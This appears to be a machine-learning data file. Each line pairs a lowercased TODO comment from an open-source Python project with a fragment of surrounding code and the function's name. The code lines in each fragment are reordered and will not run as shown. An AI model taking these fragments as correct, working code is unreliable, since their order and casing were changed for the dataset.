# todo device strategy in pytorch? </s> for member in inspect.getmembers(self.root_component):	build_eager_graph self.default_device = default_device self.device_map = device_map or dict() name, method = (member[0], member[1]) if name not in self.root_component.api_fn_by_name:
# todo: rename dest to cron, since this does more than just quiet </s> self.add_option('--cron', action='store_true', dest='quiet', default=false,	__init__ self.add_option('--reset', action='store_true', dest='reset', default=0, help='Forgets everything that has been done and learns current matches.') help='Disables stdout and stderr output, log file used. Reduces logging level slightly.') self.add_option('--validate', action='store_true', dest='validate', default=False,
# todo: replace use of request.forms with json </s> session_id = request.forms.get("sessionid", "")	session_destroy def session_destroy(): Destroy own session token if session_id in session_ids: session_ids.remove(session_id)
# todo: improve logic to handle simple types like list of strings? </s> try:	_parse_overrides else: value = args.pop(0) result[opt] = srsly.json_loads(value) except ValueError:
# todo: test for last revision on first page. </s> offset = url_for(controller='revision', action='list')	test_list_format_atom revisions = model.repo.history().all() revision1 = revisions[0] res = self.app.get(offset + '?format=atom') print res
# todo: remove them when the old workflow system will be </s> if (get_last_daemon_timestamp('workflow',when='stop')	daemon_start shell=True, stdout=subprocess.PIPE) process.wait() -get_last_daemon_timestamp('workflow',when='start'))<timedelta(0): logger.info("Workflow stop timestamp was {}; re-initializing "
# todo: remove when we stop supporting python < 3.5 </s> if sys.version_info.major < 3 or sys.version_info.minor < 5:	transform X_embedded : `numpy.ndarray`, shape=(n_samples, n_components) The embedded data points. check_is_fitted(self, ['preprocessor_', 'components_']) else:
# todo: warn/error: check if this var has units: assigning </s> if type(val) not in native_numeric_types:	set_value then the validation step is skipped. if not valid and val is not None: if self.parent_component()._units is not None: _src_magnitude = value(val)
# todo: [phil] i think we could avoid this and use a bytes buffer in memory instead, zipfile supports it </s> f = tempfile.namedtemporaryfile(delete=false)	unzip_data fname = None if data.startswith(zip_magic): fname = f.name f.write(data)
# todo add arch arm/aarch/mips/mips64/sparc/sparc64 </s> if arch is none and mode is none and endian is none:	get_arch_mode else: arch, mode, endian = unicorn.UC_ARCH_X86, unicorn.UC_MODE_64, unicorn.UC_MODE_LITTLE_ENDIAN raise Exception("Failed to get architecture parameter from mode") return arch, mode, endian
for line in json_generator:     # todo: save file here as zip on cdn </s> print line	export_tasks print app.id json_generator = respond_json("task", app.id) json_generator = respond_json("task_run", app.id) for line in json_generator:     # TODO: Save file here as ZIP on CDN
"rulesactivated": false,  # todo for testing to be compatible with protocol 0.6 </s> "instrumentation": (1 if self.alertlevels[i].instrumentation_active else 0)}	_buildAlertSystemStateMessage "name": self.alertLevels[i].name, "triggerAlways": (1 if self.alertLevels[i].triggerAlways else 0), alertLevels.append(tempDict) self.logger.debug("[%s]: Sending status message (%s:%d)." % (self.fileName, self.clientAddress, self.clientPort))
# todo lauren: make shorter by pulling out lamda and then filtering </s> comment.new_mentions = [m for m in comment.new_mentions if m not in comment.old_mentions and validate_contributor(m, comment.node.contributors)]	create ) if (comment.new_mentions): if len(comment.new_mentions) > 0: project_signals.mention_added.send(comment, auth=auth)
# todo: we really shouldn't be using socket.request.db at all, but </s> socket.request.db.close()	handle_message raise finally:
# todo: update this code to return statistics on deleted objects once we </s> try:	purge_trigger_instances timestamp.strftime('%Y-%m-%dT%H:%M:%S.%fZ')) query_filters = {'occurrence_time__lt': isotime.parse(timestamp)} TriggerInstance.delete_by_query(**query_filters) except InvalidQueryError as e:
raise deprecatedtest # this test is now broken. todo: fix it. </s> ap = make_test_ap()	test_simple_view_request def test_simple_view_request(): req = normalize_request({'id': None, 'name': None}, {'id':3, 'name':'stuff'})
# todo: st api does not allow us to say "do not focus this new view" </s> v.run_command("lsp_selection_set", {"regions": [(selection.a, selection.b)]})	center_selection v.show_at_center(selection.a)
# todo: confirmation in "r" mode </s> return none	_ except Exception as e: if isinstance(e, EOFError): else: print("unexpected error was caught.")
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
# todo: remove </s> print("\ndisabling gnome power profiles")	gnome_power_disable def gnome_power_disable(): if(gnome_power_stats != 0): call(["systemctl", "stop", "power-profiles-daemon"]) call(["systemctl", "disable", "power-profiles-daemon"])
# todo proper unit testing </s> expected_tte = expected_tte_d	test_censoring_funs_with_time def test_censoring_funs_with_time(): expected_is_censored = expected_is_censored_d times_to_event = padded_events_to_tte(events_d, discrete_time=True,t_elapsed=padded_time_discrete)
# todo: make idempotent </s> click.echo("provisioning grapl deployment")	provision @pass_graplctl_state def provision(graplctl_state: State) -> None: aws_lib.provision_grapl( lambda_=graplctl_state.lambda_,
# todo support domain delegation, which will allow us to set a sub-account to execute as. we can then </s> http = httplib2.http()	get_conn key, scope=BQ_SCOPE) http_authorized = credentials.authorize(http) service = build('bigquery', 'v2', http=http_authorized)
# todo: migrate to glaziererror </s> _logfatal('unable to remove task list', self._build_info, 4303, e)	_SetupTaskList os.remove(location) except OSError as e: return location
# todo(mordred) add this back wnen ksa releases </s> self.assertnotin('links', host['flavor'])	test_get_host_no_detail self.assertNotIn('links', host['image']) self.assertNotIn('name', host['name']) self.assertNotIn('name', host['flavor']) host_found = False
raise pathaccesserror()  # todo: path </s> sofar[path] = ret	_eval ret = target[arg] except KeyError: return ret, path
# todo: make sure this works </s> rule([	make_url_map ], 'get', project_views.register.node_register_page, OsfWebRenderer('project/register.mako')), '/project/<pid>/register/', '/project/<pid>/node/<nid>/register/',
##todo(ziad):we need to figure out how to auth to keystone </s> conn = http_connect(self.auth_host, self.auth_port, 'get',	_validate_claims "Accept": "text/json", "X-Auth-Token": self.admin_token} '/v1.0/token/%s' % claims, headers=headers) resp = conn.getresponse()
# todo: move to validator or helper </s> admins = [	remove_contributor del contributor.unclaimed_records[self._primary_key] self.contributors.remove(contributor._id) user for user in self.contributors if self.has_permission(user, 'admin')
# todo(developer): uncomment and set to a path to your audio file. </s> with io.open(speech_file, 'rb') as audio_file:	transcribe_file_with_enhanced_model from google.cloud import speech_v1p1beta1 as speech client = speech.SpeechClient() content = audio_file.read() audio = speech.types.RecognitionAudio(content=content)
# todo: send alert </s> blacklist_whitelist_notification.delay(3) # notice_type = 3 blacklist	chk_prefix_in_blacklist break if flag: return False return True
# todo check for types that are not classes and add it to </s> types = list(chain.from_iterable(	_remove_statements try: if as_names[0].names[-1] == name: evaluator.execute(t) for t in types)) except IndexError:
observable_pars = np.abs(np.random.randn(observable_class.n_params)) #todo: some operations fails when parameters are negative (e.g. thermal state) but par_domain is not fine grained enough to capture this </s> gate_wires = gate_class.n_wires if gate_class.n_wires != 0 else wires	circuit gate_class = getattr(qm, gate) gate_pars = np.abs(np.random.randn(gate_class.n_params)) observable_wires = observable_class.n_wires if observable_class.n_wires != 0 else wires gate_class(*gate_pars, list(range(gate_class.n_wires)))
# todo: sumo has a single es_url and that's the zlb and does </s> es_deets = requests.get(settings.es_urls[0]).json()	search outstanding_chunks = None try: except requests.exceptions.RequestException: pass
# np.datetime64[ns] which invalid, todo: fix pa </s> if (rhs.attr == 'dtype' and (is_series_type(rhs_type)	_run_getattr def _run_getattr(self, assign, rhs): rhs_type = self.typemap[rhs.value.name]  # get type of rhs value "S" or isinstance(rhs_type, types.Array)) and isinstance( rhs_type.dtype,
#todo(wwolf) get correct value for these </s> "updated": "2011-7-18t11:30:00z",	dispatch "id": "v1.1", "status": "CURRENT", }, {
raise notimplementederror # todo </s> def em_step(self):	EM_step
raise exception('lol') #todo fixme </s> project_dir = project_dir.rstrip('/') # strip trailing slash for os.path.split	_get_project_name def _get_project_name(self, project_dir): if not project_dir: # might be None project_name = os.path.split(project_dir)[-1] return project_name
#todo _rule_for_parents needs to made into a generator </s> self.node[node]['_rule_for_parents'] = _order	add_rule_for_parents break
# todo: fix this somehow? better use a helper func which goes over the structure. </s> ctypes.pointer(a)[0] = bvalue	assign def assign(a, bValue): if isinstance(a, type(bValue)): elif isinstance(a, (ctypes.c_void_p, ctypes._SimpleCData)): a.value = bValue
# todo find out what is best used here! </s> 'preferred_dtype': np.float32}	get_properties 'input': (DENSE, ), 'output': PREDICTIONS,
# todo(laigd): remove this check when 312743821 is in the release. </s> if use_tf_function and tf.compat.v1.__version__ < '2.3.0':	StatefulRandomOpsInDefunTestParameters def StatefulRandomOpsInDefunTestParameters(test_fn): def WrappedTestFn(self, use_tf_function): return test_fn(self, use_tf_function)
time.sleep(40)  # todo: should remove after polling get. </s> mpc_1_2_3 = op(mpc_1_2, mpc_2_3)	test_tensor_abstraction_subsets time.sleep(40)  # TODO: should remove after polling get. mpc_2_3 = op(tensor_pointer_2, tensor_pointer_3) time.sleep(40)  # TODO: should remove after polling get. exp_res_1 = op(data_1, data_2)
# todo: we want to create a state group for this set of events, to </s> prev_group = none	resolve_state_groups state_group = sg break delta_ids = None for old_group, old_ids in state_groups_ids.iteritems():
# todo: pandas returns dataframe, maybe return namedtuple instread of </s> func_text = "def f({}):\n".format(', '.join(col_name_args))	_handle_df_describe col_names = self.df_vars[func_mod.name].keys() col_name_args = ["c"+str(i) for i in range(len(col_names))] for c in col_name_args: func_text += "  {}_count = hpat.hiframes_api.count({})\n".format(c, c)
# todo: uncomment once outstanding issues with this feature are addressed </s> ])	make_url_map OsfWebRenderer('profile/notifications.mako'), ),
# todo: write this </s> pass	test_resnet def test_resnet(self):
# todo: logging </s> return none	_get_cert response = requests.get(cert_url) if response.status_code != 200: return response.content
# todo: log exception </s> ses.rollback()	db_session_scope ses.commit() except Exception as e: raise finally:
# todo find commit hash </s> prefixes = {	resolve_source path_str, line = position.rsplit(":", 1) path = Path(path_str) "nixpkgs": "https://github.com/nixos/nixpkgs/tree/master/", "nur": "https://github.com/nix-community/nur-combined/tree/master/",
# todo(twilson) we can remove this when we require ovs>=2.12.0 </s> return cls(connection_string, helper)	BaseOvnSbIdl return cls(connection_string, helper, leader_only=True) except TypeError:
# todo put this in a .extra w/a subselect </s> if not hasattr(self, '_hours_assigned'):	hours_assigned @property def hours_assigned(self): self._hours_assigned =\ self.assignments.aggregate(sum=Sum('num_hours'))['sum']
#todo also check type!! </s> for node in nodes:	execute gremlin_script %= ','.join(str(i) for i in id_set) nodes = ext.execute_script(gremlin_script) if all(matches_condition(node, c) for c in itertools.chain(indexed, unindexed)): yield node
# todo: parse flags, error checking, etc. </s> d = argv[1]	Cd def Cd(self, argv): os.chdir(d) self.mem.SetGlobalString(ast.LeftVar('PWD'), d)
# todo: either fix this or remove this code </s> return	on_rating_change def on_rating_change(self, type=None, object=None, data=None): Handles possible changes of track ratings self.image.set_from_pixbuf( self._get_rating_pixbuf (self._get_tracks()))
# todo: add tests for `in_rebase` true </s> self.assertequal(actual, expected)	test_format_branch_status_for_statusbar actual = git.get_branch_status_short()
# todo(stephenfin): the mock of 'migrate_disk_and_power_off' should </s> with mock.patch(	_create_server_and_resize_bug_1944759 inject_periodic_to_finish_resize, ) 'nova.virt.libvirt.driver.LibvirtDriver' '.migrate_disk_and_power_off', return_value='{}',
# todo: fix once issue #306 addressed in dfvfs </s> if file_object._is_open:  # pylint: disable=protected-access	_ParseDataStreamWithParser parser_mediator, parser, file_entry, file_object=file_object) finally: file_object.close()
assert study_id == 0  # todo </s> self.trials[trial_id].params[param_name] = value	report_param def report_param(self, study_id, trial_id, param_name, value):
# todo: figure out way to paramaterize node['osd_ids'] for this test </s> for osd_id in node["osd_ids"]:	test_osd_are_mounted def test_osd_are_mounted(self, node, MountPoint): assert MountPoint("/var/lib/ceph/osd/ceph-%s" % osd_id).exists
system_info = none #todo </s> new_info_file = recordinginfofile.create_empty_file(rec_dir)	recording_update_pupil_mobile_to_pprf_2_0 recording_software_version = None  # TODO recording_name = None  # TODO new_info_file.recording_uuid = recording_uuid new_info_file.start_time_system_s = start_time_system_s
# todo link subscribers_changed in docstring to callback docs </s> spotify.error.maybe_raise(lib.sp_playlist_update_subscribers(	update_subscribers The ``subscribers_changed`` callback will be called when the subscriber data has been updated. spotify.session_instance._sp_session, self._sp_playlist))
# todo: use proper file name </s> filename = "/tmp/release-colors.img"	download_cover_art if row["mime_type"] == "application/pdf": continue with open(filename, 'wb') as f: for chunk in r:
# todo: replicate complete behaviour of urllib.urlopener.retrieve </s> def retrieve( self, url, filename = none, reporthook = none, data = none ):	retrieve def mkdtemp( target_filepath ): destination_directory = tempfile.mkdtemp()
# todo if not found, getmessages to find the sender and chat </s> return self._client.get_input_entity(self.message.to_id)	input_chat @property def input_chat(self):
"history_id": self.history_id,  # todo: shouldn't be needed :( </s> "targets": json.dumps(targets),	test_fetch_recursive_archive_history }] payload = { } self.dataset_populator.fetch(payload)
# todo: unit test! </s> if len(self._node_attribute_arrays) > 0:	node_types Returns: set of types return set(self._node_attribute_arrays.keys()) else:
# todo: remove pragma when we drop 2.7 </s> if value is none:  # pragma: no cover	DateTimeParser else: value = match.group(token) raise ParserMatchError( "Unable to find a match group for the specified token '{}'.".format(
#todo fixme: we should provide an option to create the page </s> continue	main if not item.exists(): pywikibot.output('%s doesn\'t have a wikidata item :(' % page) for claim in real_claims: pywikibot.output('Adding %s --> %s' % (claim.getID(), claim.getTarget().getID()))
# todo implement with unfold </s> raise notimplementederror	bias_jac_mat_prod def bias_jac_mat_prod(self, module, g_inp, g_out, mat):
# todo: op should be initialized with op = be.constant(np_val, name=node.name) </s> shape = [d.size for d in const_tensor.tensor_shape.dim]	create_neon_op const_tensor = node.attr['value'].tensor np_val = tensor_util.MakeNdarray(const_tensor) if len(shape) == 2: if node.name == 'weights':
return # todo raise error </s> self.backend.playback.stop().get()	Stop if not self.get_CanControl(): logger.debug(u'%s.Stop not allowed', PLAYER_IFACE)
print("error, how does this happen?") #todo </s> 1/0	get_regs_per_thread3_2 reg_counters.pop() else: elif isinstance(sched_item, RunInstruction): insn = knl.id_to_insn[sched_item.insn_id]
# todo implement this method </s> :return:	send_event :param event: the event to be sent
# todo: verify logic for create -- we shouldn't 'annexify' non-annexified </s> annex = annexrepo(repotop, create=true) # if got there -- must be a git repo	_open filedir = dirname(file) repotop = GitRepo.get_toppath(filedir) if not annex.file_has_content(file): lgr.info("File %s has no content -- retrieving", file)
# todo: collapse identical parameter values in a single one </s> for instance in instanceinfo.values():	LUClusterVerify full_params = cluster.GetHVDefaults(hv_name, os_name=os_name) hvp_data.append(("os %s" % os_name, hv_name, full_params)) if not instance.hvparams: continue
'units': '1',  # todo: where does this come from??? </s> 'dtype': stat['dtype'],	create_storage_unit var_params = get_variable_params(config) measurements = [{'name': measurement_name, 'nodata': stat['nodata']}] filename_template = str(Path(config['location'], stat['file_path_template']))
# todo increase precision </s> eps = numpy.finfo(float).eps	check_degree_ortho def check_degree_ortho(approximate, exact, dim, tol=1.0e-14): for degree, (approx, ex) in enumerate(zip(approximate, exact)): mytol = abs(ex)*tol + (1.0e5+tol+ex)*eps
# todo: check md5sum if available </s> if os.path.getsize(path) != info['length']:	verify_bt_single_file def verify_bt_single_file(path, info): return False piece_length = info['piece length']
# todo: does this import need to be delayed because </s> from pyomo.solvers.plugins.solvers.persistent_solver import \	solve exception_on_failure=True, io_options=None): PersistentSolver if self.instance is None:
# @todo: pheonix </s> tree.setitemtext(childid, 1, "level %d" % int(level) if isinstance(level, float) else level)	populateSkillTreeSkillSearch level, dirty = sChar.getSkillLevel(char.ID, id)
# todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# todo: fixme-  assumes only one topic (next two lines) </s> self.context.currentnode = self.topology.sources[0]	process record = self.queue.get() self.context.currentRecord = record self.topology.sources[0].process(record.key(), record.value()) self.context.currentRecord = None
# todo: refactor common tests for all models, e.g. shape checking </s> scores = model.forward_owa(triples)	test_rotate batch_size = 16 triples = torch.zeros(batch_size, 3, dtype=torch.long) assert scores.shape == (batch_size, 1) assert scores.max() <= 0.
# todo: manage errors </s> self._uuid = params["uuid"]	_project_created def _project_created(self, params): log.info("Project {} created".format(self._uuid))
# todo: when tool prints input bam filename, use that instead </s> s_name = self.clean_s_name(os.path.basename(f['root']), f['root'])	parse_dedup_log log.debug('Could not calculate "not_removed"') if len(parsed_data) > 0: self.dedup_data[s_name] = parsed_data
# todo(nnorwitz): enable test. </s> def _testarray(self):	_testArray tokens = GetTokens('Bar[]') result = self.converter.CreateReturnType(list(tokens))
# todo: save as yaml file </s> if not os.path.exists(handeyepersistence.directory):	to_file def to_file(self, namespace, calibration): os.makedirs(HandeyePersistence.DIRECTORY) filename = HandeyePersistence.DIRECTORY + rospy.get_namespace() + '.yaml'
except oserror:  # todo: use filenotfounderror once drop python 2 </s> if dssp == 'dssp':	__init__ try: dssp_dict, dssp_keys = dssp_dict_from_pdb_file(in_file, dssp) dssp = 'mkdssp' elif dssp == 'mkdssp':
# todo: fix later </s> nbest_hyps_idx, aws, scores = [], [], []	beam_search ctc_prefix_score = CTCPrefixScore(tensor2np(ctc_log_probs)[0], self.blank, self.eos) cvs, alpha, aws = self.score(eouts, elens, max_len=200) eos_flags = [] for b in range(bs):
except exception:  # todo - which exceptions? </s> pass  # skip unparsable tag	_parse_feature try: feature.qualifiers[feature_element.tag.replace(NS, '')] = feature_element.text self.ParsedSeqRecord.features.append(feature)
# todo: also dispatch server-sent event </s> store_execution_stderr_line(execution_id=execution_id, line=line)	read_and_store_stderr if not line: break buff.write(line) except RuntimeError:
with prepare_file(["#todo this is todo"], none) as (lines, filename): </s> retval, output = execute_coala(coala_json.main, "coala-json",	test_output_file def test_output_file(self): "-c", os.devnull, "-b", "LineCountTestBear",
# @todo: "smart" & ssh keys for non-localhost </s> "connection": "local",	setup_instance_method roles_path = os.path.join(current.request.folder, "private", "eden_deploy", "roles") playbook = [{"hosts": host, "remote_user": server.remote_user, "become_method": "sudo",
# todo: this scrolling is lame and centers text :/ </s> self.view.show(size)	run self.view.insert(edit, size, data) self.view.set_read_only(True)
else:  # todo(@rasooli) t44144867: remove this logic after a while. </s> char_source_dict = pytorch_translate_dictionary.dictionary.load(	PytorchTranslateTask if "extra_state" in kwargs and "char_source_dict" in kwargs["extra_state"]: char_source_dict = kwargs["extra_state"]["char_source_dict"] args.char_source_vocab_file )
raise notimplementederror # todo </s> update or add the item	save def save(self, item):
# todo: position independend compare </s> if hashed_pin == hash_pin:	check_hashed_pin :return: boolean hash_pin = utils.hash_digest(pin.encode('utf-8'), iv) return True return False
# todo: update npt.assert_almost_equal calls to use distancematrix </s> dm1 = beta_diversity('weighted_unifrac', self.table1, self.sids1,	test_weighted_unifrac_partial_full def test_weighted_unifrac_partial_full(self): otu_ids=self.oids1, tree=self.tree1) dm2 = beta_diversity('weighted_unifrac', self.table1, self.sids1,
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_square_draw @requires_scipy() def test_square_draw(): raise SkipTest pos = np.array([[-0.5, 0.5, 0],
# todo: make it irrelevent whether we test a python or a tf component (api and handling should be 100% identical) </s> test.test(("preprocess", 2.0), expected_outputs=1.0)	test_simple_preprocessor_stack_with_one_preprocess_layer test.test("reset")
# todo: write me </s> pass	test_search_entities def test_search_entities(self):
### todo: etc </s> else:	_merge except exc.GitCommandError as err: print(err) print(" done.")
# todo: rf to use --batch where possible instead of splitting </s> if not files:	_run_annex_command_json if args: annex_options += args file_chunks = [[]] else:
# todo: check against plural_rules[lang]['nplurals'] </s> try:	translate else: num = parameters index = plural_rules[code]['plural'](num) except KeyError:
# todo - exponential backoff </s> req = offsetcommitrequest(consumer_group,	commit_consumer_group_offsets :param preqs: a sequence of <protocol.PartitionOffsetCommitRequest> :type preqs: sequence consumer_group_generation_id, consumer_id,
# todo: can this be replaced by action_channel()? </s> if module_name == 'channel':	unset self[module_name] = None log.info("%s is now unset" % (module_name)) self['shell_php']['status'] = Status.IDLE
n)  # todo: access alice's private key inside this method. </s> policy = policy.from_alice(	create_policy_group alice_priv_enc = self.owner._crypto_power._power_ups[EncryptingPower].priv_key kfrags, pfrag = self.owner.generate_rekey_frags(alice_priv_enc, bob, m, alice=self.owner, bob=bob,
# todo delete me </s> import yaml	parseSDFInertial list(inertia), key=lambda el: el.tag)] inertial_dict['name'] = 'inertial_' + link.attrib['name'] print(yaml.dump(inertial_dict)) return inertial_dict
# todo(leofang): test newer rocm versions </s> if cupy.cuda.runtime.is_hip:	test_default_fft_func fft_func = _default_fft_func(ca, s=s, axes=axes, value_type='C2R') if enable_nd: assert fft_func is _fft else:
#todo rewrite this part of pdfkit.py </s> r = pdfkit.pdfkit('<html><head></head><body>hai!</body></html>', 'string')	test_stylesheet_adding_to_the_head def test_stylesheet_adding_to_the_head(self): css = open('testfiles/example.css') r.stylesheets.append(css)
# todo: fix with stubber / before send event </s> return original_send(self, *args, **kwargs)	mock_endpoint_send else:
pass # todo </s> def upload_ssk(write_capability, new_version, uploadable):	upload_ssk
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pminub x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: handle non-numerical (e.g. string, datetime) columns </s> nodes = []	_run_call_concat def _run_call_concat(self, assign, lhs, rhs): out_typ = self.typemap[lhs.name] df_list = guard(get_definition, self.func_ir, rhs.args[0]).items
# @todo: refactor: split to smaller routines </s> class getlocalpkgsversionstask():	cli_search_packages def cli_search_packages(args): async def get_task(self): return {
# todo: assert </s> self.asserttrue(result)	test_find_system Test: find a system object result = self.remote.find_system({"name": "testsystem0"}, self.token) assert 0
# todo : use starttls when mailnag has been migrated to python 3 </s> logging.warning("using unencrypted connection for account '%s'" % self.name)	get_connection else: conn = poplib.POP3(self.server, int(self.port)) conn.getwelcome() conn.user(self.user)
# todo use case-xml case creation workflow </s> return c	make_supply_point c.save()
# todo(eric_k): unicorn@1.0.2rc1 doesn't like writing to </s> self.registers -= {"fs"}	__init__ self.registers = set(self._cpu.canonical_registers) self.registers -= self.flag_registers self.registers.add("EFLAGS") for reg in self.registers:
# todo: properly resolve samaccounname in gc </s> domain = self.domain	fetch_sessions continue for ses in sessions: user = ('%s@%s' % (ses['user'], domain)).upper() target = str(ses['target']).upper()
# todo add rising vs top </s> req_url = "https://www.google.com/trends/api/widgetdata/relatedsearches"	search_queries def search_queries(self): searchqueries_payload = dict() searchqueries_payload['req'] = json.dumps(self.related_queries_widget['request'])
# todo: how to check it? meybe we can omit this test </s> pass	test_uniformintfill def test_uniformintfill():
# todo: add logger here </s> print(e)	save_raw_output sessions.destroy_session(session) except Exception as e:
# todo: fixme </s> wa = node1.cd_ref.transform_node_to_global_assuming_rectangular(wa)	_fill_bar_yz if offt_end_a == 'G': if node1.Cd() != 0: elif offt_end_a == 'B': pass
# todo(junxian): transform to decoder state size </s> self._add_internal_trainable_variables()	ReparameterizedStochasticConnector if len(output.get_shape()) == 1: output = output.reshape([batch_size, 1]) self._built = True
# todo(b/80125832): enable nccl in tests </s> params = base_params._replace(gradient_repacking=3,	test_grad_aggregation hierarchical_copy=True) self._test_grad_aggregation(params, 10) variable_consistency='relaxed', all_reduce_spec='pscpu')
# todo logging </s> pass	_parse_image content = content.replace(url, '<img src="{}" '.format(url_local)) except: return content
''' # todo filter in the database? </s> cursor = bdb.sql_execute(params_sql, (generator_id,))	_all_mus_sigmas SELECT colno, modelno, mu, sigma FROM bayesdb_nig_normal_models WHERE generator_id = :generator_id all_mus = {} all_sigmas = {}
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: slugification should be abstracted out somewhere reusable </s> self.permalink = re.sub(	__post_process re.sub(":title", re.sub("[ ?]", "-", self.title).lower(), self.permalink) ":filename", re.sub( "[ ?]", "-", self.filename).lower(), self.permalink)
# todo: log errors to log file </s> pass	run_cli self.parse_kubeconfig() except: user_input = prompt('kube-shell> ', history=self.history,
# todo: should be able to just access the api from qml. </s> @pyqtslot(result = str)	getStoredKey def getStoredKey(self) -> str: current_machine = self._api.machines.getCurrentMachine()
time.sleep(1)  # todo: avoid race conditions in other way </s> self.assertraises(errors.error, self._probe, 'bar')	test_probe_connection_error def test_probe_connection_error(self): self._probe('foo')
# todo confirm we want floor division here </s> numobs = data.size() // numvars // numalts	mnl_loglik logger.debug('start: calculate MNL log-likelihood') numvars = beta.size beta = np.reshape(beta, (1, beta.size)) beta = PMAT(beta, data.typ)
#todo take image as a factor </s> img_len = 0	calc_node_score The one with most text is the most likely article, naive and simple text_len = self.text_len(node) impact_factor = self.semantic_effect(node) self.scores[node] += (text_len + img_len) * impact_factor * (depth**1.5)  # yes 1.5 is a big number
# todo: checks for being not outside of this repository </s> and opj('annex', 'objects') in os.readlink(filepath)  # realpath ok	file_has_content return exists(filepath) and ( islink(filepath) ) return self._check_files(self.find, quick_check,
# todo: no-op component? </s> stage_op = none	update_from_memory states, terminals, action_probs_mu, initial_internal_states = self_.call(staging_area.unstage) else:
"""the event which triggered the message."""#todo elaborate </s> s.bytes = bytes	__new__ s.nick = origin.nick s.event = event s.match = match The regular expression ``MatchObject_`` for the triggering line.
# todo: could use trim_silence() here or a better vad. </s> energy = np.abs(audio)	cache_audio_file return audio = Audio.read(input_filename, self.sample_rate) silence_threshold = np.percentile(energy, 95) offsets = np.where(energy > silence_threshold)[0]
# todo: allow prerelease for now </s> prerelease = release.get('prerelease', false) and false	_find_latest_version match = re.search(pattern, release.get('tag_name')) if match: if not prerelease: version = match.group('v')
# todo: add recovery test </s> self._phabupdatewithexpectations(total=1, bad=1)	test_badBaseWorkflow self._devPushNewFile("NEWFILE", has_plan=False)
# todo: remove in 21.08 </s> if cache_audio_dir is not none:	generate_cache_text cache_audio_dir (path): DEPRECATED path to store .wav files cache_text_file (file): file containing the sentences LOG.warning( "the cache_audio_dir argument is deprecated. ensure the directory "
# todo(developer): uncomment these lines and replace with your values. </s> parent = client.queue_path(project, location, queue)	create_http_task from google.protobuf import timestamp_pb2 client = tasks_v2beta3.CloudTasksClient()
# todo: truffle change end </s> dig = []	sha_transform256 do_part1(ss, RND) do_part2(ss, RND) for i, x in enumerate(sha_info['digest']): dig.append( (x + ss[i]) & 0xffffffff )
# todo: make sure reply_email is unique </s> reply_email = f"reply+{random_words()}@{email_domain}"	MailHandler website_email, ) forward_email = ForwardEmail.create( gen_email_id=gen_email.id,
# todo! make this whole operation one undo </s> sprites = {}	export def export(self): for layer in self.img.layers: if layer.visible:
# todo: passing config is wrong, but changing this revealed more complicated issues </s> self._exporters[exporter_name] = exporter(config=self.config, parent=self)	from_notebook_node if exporter_name not in self._exporters: Exporter = get_exporter(exporter_name) exporter = self._exporters[exporter_name] return exporter.from_notebook_node(nb, resources, **kw)
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: test </s> @overload(gather_scalar)	gather_scalar_overload def gather_scalar_overload(data_t): assert isinstance(data_t, (types.Integer, types.Float))
# populated by coredb._solve(). todo: find a better solution for that. </s> self.direct_deps = []	__init__ basename = os.path.basename(core_file) self.core_file = core_file self.depend = [] self.simulators = []
# todo(b/147242148): introduce principled artifact structure (directory </s> if isinstance(artifact, types.valueartifact):	_prepare_output_artifacts artifact.uri = _generate_output_uri(base_output_dir, name, execution_id, is_single_artifact, i) artifact.uri = os.path.join(artifact.uri, 'value') _prepare_output_paths(artifact)
# todo: remove this log statement when invoking this method on each iteration of the goal state loop (currently it is invoked only on a new goal state) </s> logger.info("fetched extensions goal state [correlation id: {0} etag: {1}]", correlation_id, response_etag)	update_extensions_goal_state response_etag = h[1] break if response_etag is None: logger.info("Expected a new goal state; will retry after a short delay...")
# compare filesizes todo print analysis of this :) </s> cmd = "ls -l '%s.ttf'*" % filename	optimize_ttx cmd = "ttx -i -q '%s.ttx'" % filename run(cmd, cwd=path_params._out, log=self.stdout_pipe) run(cmd, cwd=path_params._out, log=self.stdout_pipe) os.remove(op.join(path_params._out, filename + '.ttf.orig'),
#todo - use the following more helpful error, but update unit tests </s> raise valueerror("sequences must all be the same length")	_append raise TypeError("New sequence is not a SeqRecord object") if expected_length is not None and len(record) != expected_length: if not Alphabet._check_type_compatible([self._alphabet, record.seq.alphabet]): raise ValueError("New sequence's alphabet is incompatible")
# todo(shardy): remove when we no longer support essex </s> nova = client.client(username=con.username,	authenticate no_cache=True) except TypeError: api_key=con.password, project_id=con.tenant,
# todo 找出数据重复的原因 </s> spread_others = list(set(spread_others))	_get_reposts else: so.upper_user_id = user_id spread_other_dao.save(spread_others) print('一共获取了{num}条转发信息'.format(num=len(spread_others)))
# todo: remove this </s> logger.warning((	windows_file def windows_file(*args, **kwargs): 'Use of `windows_files.windows_file` is deprecated, ' 'please use `windows_files.file` instead.'
# todo(ja): reclaiming space should be done lazy and low priority </s> self._copy_volume('/dev/zero', self.local_path(volume), size_in_g)	_delete_volume def _delete_volume(self, volume, size_in_g): self._try_execute('lvremove', '-f', "%s/%s" % (FLAGS.volume_group,
# todo find a better way of checking for no pregenerated thresholds </s> self.code_gen_dict["$pragmas$"].append(	pragmas ) if self.calc_tmem() != 0: ( "DO_PRAGMA(HLS ARRAY_PARTITION variable=threshs.m_thresholds "
# todo: the test currently demonstrates broken behavior </s> check that buildbot does not allow extra claims on a claimed lock after	test_changing_max_lock_count_does_not_break_builder_locks self, builder_count, lock_cls, mode, max_count_before, max_count_after, allowed_builds_before, allowed_builds_after): a reconfig that changed the maxCount of that lock. Some Buildbot versions created a completely separate real lock after each maxCount
